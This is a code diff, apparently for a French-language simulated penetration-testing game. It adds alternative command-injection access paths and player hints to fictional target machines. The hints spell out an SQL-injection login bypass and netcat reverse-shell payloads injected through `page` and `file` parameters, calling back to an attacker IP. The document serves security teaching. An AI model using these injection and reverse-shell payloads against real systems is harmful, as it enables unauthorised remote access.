@@ -313,6 +313,15 @@ const MACHINES = [
         "# Compte admin connu : broland (mot de passe non stocke ici)",
     },
     ftp: { enabled: false },
+    // Chemin alternatif (optionnel) : le même paramètre `page` vulnérable à la LFI est en
+    // réalité passé à un include qui shelle côté serveur — une injection de commande y est
+    // donc possible. Même schéma générique que MERIDIAN : `nc -lvnp <port>` puis un curl qui
+    // fait rappeler le serveur vers l'attaquant. Le moteur parse l'IP/port depuis le payload.
+    altAccess: {
+      path: "/index.php",
+      injectRegex: /page=[^;&]*;\s*nc\b/i,
+      user: "broland",
+    },
     sqli: {
       path: "/admin/login.php",
       injectionRegex: /'\s*or\s*'?1'?\s*=\s*'?1/i,
@@ -356,6 +365,7 @@ const MACHINES = [
         "Le fichier recupere revele que le formulaire d'admin construit sa requete SQL sans echapper les entrees.",
         "Une injection SQL classique de contournement de login ressemble a : `' OR '1'='1' -- -`.",
         "Envoie-la en POST avec curl : `curl -d \"user=broland&pass=' OR '1'='1' -- -\" http://10.10.11.58/admin/login.php`. La reponse revele un mot de passe SSH, a utiliser avec `ssh broland@10.10.11.58`.",
+        "(Bonus, pas necessaire) Le parametre `page` ne fait pas que lire un fichier : il est passe a un include qui shelle cote serveur, donc une injection de commande y est possible. Mets-toi en ecoute sur le port de ton choix avec `nc -lvnp 5555`, puis declenche `curl \"http://10.10.11.58/index.php?page=fr.html;nc 10.10.14.1 5555 -e /bin/sh\"` pour obtenir l'acces sans passer par l'injection SQL.",
       ],
       privesc: [
         "`sudo -l` ne donne rien a premiere vue... regarde bien la commande NOPASSWD autorisee.",
@@ -390,12 +400,14 @@ const MACHINES = [
     },
     // Chemin alternatif (optionnel, non nécessaire pour finir la machine) : le endpoint
     // /report exécute en réalité le paramètre file dans un shell côté serveur, sans le
-    // moindre échappement. En restant en écoute avec `nc -lvnp 4444` puis en déclenchant
-    // exactement ce chemin, le "serveur" ouvre une connexion vers l'attaquant — même accès
-    // que ssh, juste par une autre voie (injection de commande plutôt que fuite d'identifiants).
+    // moindre échappement. En restant en écoute avec `nc -lvnp <port>` puis en déclenchant
+    // une injection de commande sur ce endpoint, le "serveur" ouvre une connexion vers
+    // l'attaquant — même accès que ssh, juste par une autre voie (injection de commande
+    // plutôt que fuite d'identifiants). Schéma générique (voir aussi PHANTOM) : le moteur
+    // parse l'IP/port du callback depuis le payload, donc le joueur choisit librement son port.
     altAccess: {
-      triggerPath: `/report?file=report.txt;nc ${ATTACKER_IP} 4444 -e /bin/sh`,
-      port: 4444,
+      path: "/report",
+      injectRegex: /file=[^;&]*;\s*nc\b/i,
       user: "npatel",
     },
     targetFS: {
@@ -430,7 +442,7 @@ const MACHINES = [
         "La sauvegarde contient des identifiants SSH en clair.",
         "SSH_USER et SSH_PASS sont directement utilisables.",
         "Connecte-toi avec `ssh npatel@10.10.11.101` et le mot de passe trouvé dans config.bak.",
-        "(Bonus, pas nécessaire) Le endpoint /report ne se contente pas de lire un fichier : il exécute carrément le paramètre `file` dans un shell côté serveur. Écoute en local avec `nc -lvnp 4444`, puis déclenche `curl \"http://10.10.11.101:8080/report?file=report.txt;nc 10.10.14.1 4444 -e /bin/sh\"` pour obtenir l'accès sans jamais toucher à ssh.",
+        "(Bonus, pas nécessaire) Le endpoint /report ne se contente pas de lire un fichier : il exécute carrément le paramètre `file` dans un shell côté serveur. Écoute en local sur le port de ton choix avec `nc -lvnp 4444`, puis déclenche `curl \"http://10.10.11.101:8080/report?file=report.txt;nc 10.10.14.1 4444 -e /bin/sh\"` (mets le même port des deux côtés) pour obtenir l'accès sans jamais toucher à ssh.",
       ],
       privesc: [
         "`sudo -l` liste une seule commande NOPASSWD, très polyvalente...",
@@ -637,8 +649,8 @@ function validateMachines(machines) {
     if (!m.hints || !m.hints.recon || !m.hints.access || !m.hints.privesc) {
       errors.push(`${tag} : "hints" doit fournir recon/access/privesc`);
     }
-    if (m.altAccess && (!m.altAccess.triggerPath || !m.altAccess.port || !m.altAccess.user)) {
-      errors.push(`${tag} : "altAccess" incomplet (triggerPath/port/user requis)`);
+    if (m.altAccess && (!m.altAccess.path || !(m.altAccess.injectRegex instanceof RegExp) || !m.altAccess.user)) {
+      errors.push(`${tag} : "altAccess" incomplet (path/injectRegex/user requis)`);
     }
   });
   return errors;
